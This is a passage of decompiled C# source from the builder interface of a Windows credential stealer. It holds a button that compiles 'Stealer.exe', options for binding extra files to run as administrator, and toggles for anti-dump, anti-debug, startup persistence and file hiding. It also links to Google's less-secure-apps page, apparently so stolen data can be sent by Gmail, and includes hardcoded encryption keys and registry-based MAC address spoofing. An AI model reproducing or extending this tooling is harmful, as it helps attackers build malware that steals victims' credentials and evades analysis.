			this.tabPage1.BackColor = Color.Black;
			this.tabPage2.BackColor = Color.Black;
			this.DropPathtxt.Enabled = false;
			this.Passwordtxt.UseSystemPasswordChar = PasswordPropertyTextAttribute.Yes.Password;
			base.StyleManager = this.metroStyleManager1;
			this.metroStyleManager1.Theme = MetroThemeStyle.Dark;
			base.StyleManager.Theme = MetroThemeStyle.Dark;
			base.ControlBox = false;
			this.MaximumSize = base.Size;
			this.MinimumSize = base.Size;
			this.LocalTxt.UseSystemPasswordChar = true;
			this.PublicTxt.UseSystemPasswordChar = true;
			foreach (NetworkInterface i in from a in NetworkInterface.GetAllNetworkInterfaces()
			where Form1.Adapter.IsValidMac(a.GetPhysicalAddress().GetAddressBytes(), true)
			orderby a.Speed descending
			select a)
			{
				this.AdaptersComboBox.Items.Add(new Form1.Adapter(i));
			}
			this.AdaptersComboBox.SelectedIndex = 0;
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00002FCC File Offset: 0x000011CC
		private void BuildStealer_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.FileName = "Stealer.exe";
			saveFileDialog.Filter = "Exe files (Obviously) (*.exe)|*.exe";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.compile2(saveFileDialog.FileName);
				return;
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x0000300B File Offset: 0x0000120B
		private void CopyStealer_CheckedChanged(object sender, EventArgs e)
		{
			if (this.CopyStealer.Checked)
			{
				this.DropPathtxt.Enabled = true;
				return;
			}
			this.DropPathtxt.Enabled = false;
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00003033 File Offset: 0x00001233
		private void ProtectStr_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00003038 File Offset: 0x00001238
		private void AddFilesToBind_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				ListViewItem value = new ListViewItem(new string[]
				{
					openFileDialog.FileName,
					"true",
					"false"
				});
				this.listView1.Items.Add(value);
				return;
			}
		}

		// Token: 0x06000024 RID: 36 RVA: 0x0000308C File Offset: 0x0000128C
		private void listView1_DragDrop(object sender, DragEventArgs e)
		{
			foreach (string text in (string[])e.Data.GetData(DataFormats.FileDrop, false))
			{
				ListViewItem value = new ListViewItem(new string[]
				{
					text,
					"true",
					"false"
				});
				this.listView1.Items.Add(value);
			}
		}

		// Token: 0x06000025 RID: 37 RVA: 0x000030F4 File Offset: 0x000012F4
		private void listView1_DragEnter(object sender, DragEventArgs e)
		{
			if (e.Data.GetDataPresent(DataFormats.FileDrop))
			{
				e.Effect = DragDropEffects.Copy;
				return;
			}
			e.Effect = DragDropEffects.None;
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00003117 File Offset: 0x00001317
		private void RemoveSelected_Click(object sender, EventArgs e)
		{
			if (this.listView1.Items.Count > 0)
			{
				this.listView1.SelectedItems[0].Remove();
			}
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00003144 File Offset: 0x00001344
		public bool isvalidFilepath(string path)
		{
			bool result;
			try
			{
				string[] array = path.Split(new char[]
				{
					':'
				});
				if (path.Length >= 6 && path.Contains(":\\") && array[0].Length == 1 && Regex.IsMatch(array[0], "^[a-zA-Z]+$"))
				{
					result = true;
				}
				else
				{
					result = false;
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000028 RID: 40 RVA: 0x000031B4 File Offset: 0x000013B4
		private void ToggleExe_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems[0].SubItems[1].Text == "true")
			{
				this.listView1.SelectedItems[0].SubItems[1].Text = "false";
				return;
			}
			if (this.listView1.SelectedItems[0].SubItems[1].Text == "false")
			{
				this.listView1.SelectedItems[0].SubItems[1].Text = "true";
			}
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00003268 File Offset: 0x00001468
		private void ToggleRunAsAdmin_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems[0].SubItems[2].Text == "true")
			{
				this.listView1.SelectedItems[0].SubItems[2].Text = "false";
				return;
			}
			if (this.listView1.SelectedItems[0].SubItems[2].Text == "false")
			{
				this.listView1.SelectedItems[0].SubItems[2].Text = "true";
			}
		}

		// Token: 0x0600002A RID: 42 RVA: 0x0000331C File Offset: 0x0000151C
		private void label8_Click(object sender, EventArgs e)
		{
			Process.Start("https://www.youtube.com/channel/UCpbHU8fNTw5DOUgsWbX62-A");
		}

		// Token: 0x0600002B RID: 43 RVA: 0x0000332C File Offset: 0x0000152C
		private void Showpassxd_CheckedChanged(object sender, EventArgs e)
		{
			if (this.Showpassxd.Checked)
			{
				this.Passwordtxt.UseSystemPasswordChar = PasswordPropertyTextAttribute.No.Password;
				return;
			}
			if (!this.Showpassxd.Checked)
			{
				this.Passwordtxt.UseSystemPasswordChar = PasswordPropertyTextAttribute.Yes.Password;
			}
		}

		// Token: 0x0600002C RID: 44 RVA: 0x0000337E File Offset: 0x0000157E
		private void metroComboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00003380 File Offset: 0x00001580
		private void metroLabel2_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00003388 File Offset: 0x00001588
		private void metroLabel3_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00003391 File Offset: 0x00001591
		private void label1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000030 RID: 48 RVA: 0x00003393 File Offset: 0x00001593
		private void AntiDump_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00003395 File Offset: 0x00001595
		private void AntiDebug_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00003397 File Offset: 0x00001597
		private void RegularStartup_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000033 RID: 51 RVA: 0x00003399 File Offset: 0x00001599
		private void HideFile_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000034 RID: 52 RVA: 0x0000339B File Offset: 0x0000159B
		private void label9_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000035 RID: 53 RVA: 0x0000339D File Offset: 0x0000159D
		private void HideFilesBinded_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000036 RID: 54 RVA: 0x0000339F File Offset: 0x0000159F
		private void metroLabel20_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000037 RID: 55 RVA: 0x000033A1 File Offset: 0x000015A1
		private void metroLabel24_Click(object sender, EventArgs e)
		{
			Process.Start("https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4NeDdM1y5MNfgEOMJR6fLIwjcIx2J4X9vFOFmdQrfy6zb_ZdxJqvqNe6b8-NvpB6wnoS3baXt0X3Wv9yFRP3luszRN7rg");
		}

		// Token: 0x06000038 RID: 56 RVA: 0x000033AE File Offset: 0x000015AE
		private void metroCheckBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.Anan.Checked)
			{
				this.LocalTxt.UseSystemPasswordChar = false;
				this.PublicTxt.UseSystemPasswordChar = false;
				return;
			}
			this.LocalTxt.UseSystemPasswordChar = true;
			this.PublicTxt.UseSystemPasswordChar = true;
		}

		// Token: 0x06000039 RID: 57 RVA: 0x000033EE File Offset: 0x000015EE
		private void Anan_CheckedChanged(object sender, EventArgs e)
		{
			if (this.Anan.Checked)
			{
				this.LocalTxt.UseSystemPasswordChar = false;
				this.PublicTxt.UseSystemPasswordChar = false;
				return;
			}
			this.LocalTxt.UseSystemPasswordChar = true;
			this.PublicTxt.UseSystemPasswordChar = true;
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00003430 File Offset: 0x00001630
		private void metroButton5_Click(object sender, EventArgs e)
		{
			string machineName = Environment.MachineName;
			this.TextBox1.Text = machineName;
			string userName = Environment.UserName;
			this.TextBox2.Text = Convert.ToString(userName);
			foreach (IPAddress ipaddress in Dns.GetHostAddresses(Dns.GetHostName()))
			{
				if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
				{
					this.LocalTxt.Text = ipaddress.ToString();
				}
			}
			string requestUri = "https://api.ipify.org/";
			using (HttpClient httpClient = new HttpClient())
			{
				string result = httpClient.GetStringAsync(requestUri).Result;
				this.PublicTxt.Text = result;
			}
		}

		// Token: 0x04000004 RID: 4
		public static string jafajwj = "aqnjrt4g56jn4ws564g154t5sa4e4agbg8n97";

		// Token: 0x04000005 RID: 5
		private static string initVector = "r5dm5fgm24mfhfku";

		// Token: 0x04000006 RID: 6
		private const int keysize = 256;

		// Token: 0x04000007 RID: 7
		private static Random strchange65 = new Random();

		// Token: 0x0200002D RID: 45
		public class Adapter
		{
			// Token: 0x060001BA RID: 442 RVA: 0x0000EFA6 File Offset: 0x0000D1A6
			public Adapter(ManagementObject a, string aname, string cname, int n)
			{
				this.adapter = a;
				this.adaptername = aname;
				this.customname = cname;
				this.devnum = n;
			}

			// Token: 0x060001BB RID: 443 RVA: 0x0000EFCB File Offset: 0x0000D1CB
			public Adapter(NetworkInterface i) : this(i.Description)
			{
			}

			// Token: 0x060001BC RID: 444 RVA: 0x0000EFDC File Offset: 0x0000D1DC
			public Adapter(string aname)
			{
				this.adaptername = aname;
				ManagementObjectCollection source = new ManagementObjectSearcher("select * from win32_networkadapter where Name='" + this.adaptername + "'").Get();
				this.adapter = source.Cast<ManagementObject>().FirstOrDefault<ManagementObject>();
				try
				{
					Match match = Regex.Match(this.adapter.Path.RelativePath, "\\\"(\\d+)\\\"$");
					this.devnum = int.Parse(match.Groups[1].Value);
				}
				catch
				{
					return;
				}
				this.customname = (from i in NetworkInterface.GetAllNetworkInterfaces()
				where i.Description == this.adaptername
				select " (" + i.Name + ")").FirstOrDefault<string>();
			}

			// Token: 0x17000075 RID: 117
			// (get) Token: 0x060001BD RID: 445 RVA: 0x0000F0B8 File Offset: 0x0000D2B8
			public NetworkInterface ManagedAdapter
			{
				get
				{
					return (from nic in NetworkInterface.GetAllNetworkInterfaces()
					where nic.Description == this.adaptername
					select nic).FirstOrDefault<NetworkInterface>();
				}
			}

			// Token: 0x17000076 RID: 118
			// (get) Token: 0x060001BE RID: 446 RVA: 0x0000F0D8 File Offset: 0x0000D2D8
			public string Mac
			{
				get
				{
					string result;
					try
					{
						result = BitConverter.ToString(this.ManagedAdapter.GetPhysicalAddress().GetAddressBytes()).Replace("-", "").ToUpper();
					}
					catch
					{
						result = null;
					}
					return result;
				}
			}

			// Token: 0x17000077 RID: 119
			// (get) Token: 0x060001BF RID: 447 RVA: 0x0000F128 File Offset: 0x0000D328
			public string RegistryKey
			{
				get
				{
					return string.Format("SYSTEM\\ControlSet001\\Control\\Class\\{{4D36E972-E325-11CE-BFC1-08002BE10318}}\\{0:D4}", this.devnum);
				}
			}

			// Token: 0x17000078 RID: 120
			// (get) Token: 0x060001C0 RID: 448 RVA: 0x0000F140 File Offset: 0x0000D340
			public string RegistryMac
			{
				get
				{
					string result;
					try
					{
						using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(this.RegistryKey, false))
						{
							result = registryKey.GetValue("NetworkAddress").ToString();
						}
					}
					catch
					{
						result = null;
					}
					return result;
				}
			}

			// Token: 0x060001C1 RID: 449 RVA: 0x0000F1A0 File Offset: 0x0000D3A0
			public bool SetRegistryMac(string value)
			{
				bool flag = false;
				bool result;
				try
				{
					if (value.Length > 0 && !Form1.Adapter.IsValidMac(value, false))
					{
						throw new Exception(value + " is not a valid mac address");
					}
					using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(this.RegistryKey, true))
					{
						if (registryKey == null)
						{
							throw new Exception("Failed to open the registry key");
						}
						if (registryKey.GetValue("AdapterModel") as string != this.adaptername && registryKey.GetValue("DriverDesc") as string != this.adaptername)
						{
							throw new Exception("Adapter not found in registry");
						}
						if (MessageBox.Show(string.Format((value.Length > 0) ? "Changing MAC-adress of adapter {0} from {1} to {2}. Proceed?" : "Clearing custom MAC-address of adapter {0}. Proceed?", this.ToString(), this.Mac, value), "Change MAC-address?", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.Yes)
						{
							result = false;
						}
						else
						{
							if ((uint)this.adapter.InvokeMethod("Disable", null) != 0U)
							{
								throw new Exception("Failed to disable network adapter.");
							}
							flag = true;
							if (value.Length > 0)
							{
								registryKey.SetValue("NetworkAddress", value, RegistryValueKind.String);
							}
							else
							{
								registryKey.DeleteValue("NetworkAddress");
							}
							result = true;
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.ToString());
					result = false;
				}
				finally
				{
					if (flag && (uint)this.adapter.InvokeMethod("Enable", null) != 0U)
					{
						MessageBox.Show("Failed to re-enable network adapter.");
					}
				}
				return result;
			}

			// Token: 0x060001C2 RID: 450 RVA: 0x0000F350 File Offset: 0x0000D550
			public override string ToString()
			{
				return this.adaptername + this.customname;
			}

			// Token: 0x060001C3 RID: 451 RVA: 0x0000F364 File Offset: 0x0000D564
			public static string GetNewMac()
			{
				Random random = new Random();
				byte[] array = new byte[6];
				random.NextBytes(array);
				array[0] = (array[0] | 2);
				array[0] = (array[0] & 254);
				return Form1.Adapter.MacToString(array);
			}

			// Token: 0x060001C4 RID: 452 RVA: 0x0000F3A0 File Offset: 0x0000D5A0
			public static bool IsValidMac(string mac, bool actual)
			{
				if (mac.Length != 12)
				{
					return false;
				}
				if (mac != mac.ToUpper())
				{
					return false;
				}
				if (!Regex.IsMatch(mac, "^[0-9A-F]*$"))
				{
					return false;
				}
				if (actual)
				{
					return true;
				}
				char c = mac[1];
				return c == '2' || c == '6' || c == 'A' || c == 'E';
			}

			// Token: 0x060001C5 RID: 453 RVA: 0x0000F3FB File Offset: 0x0000D5FB
			public static bool IsValidMac(byte[] bytes, bool actual)
			{
				return Form1.Adapter.IsValidMac(Form1.Adapter.MacToString(bytes), actual);
			}

			// Token: 0x060001C6 RID: 454 RVA: 0x0000F409 File Offset: 0x0000D609
			public static string MacToString(byte[] bytes)
			{
				return BitConverter.ToString(bytes).Replace("-", "").ToUpper();
			}

			// Token: 0x040000F0 RID: 240
			public ManagementObject adapter;

			// Token: 0x040000F1 RID: 241
			public string adaptername;

			// Token: 0x040000F2 RID: 242
			public string customname;

			// Token: 0x040000F3 RID: 243
			public int devnum;
		}
	}
}
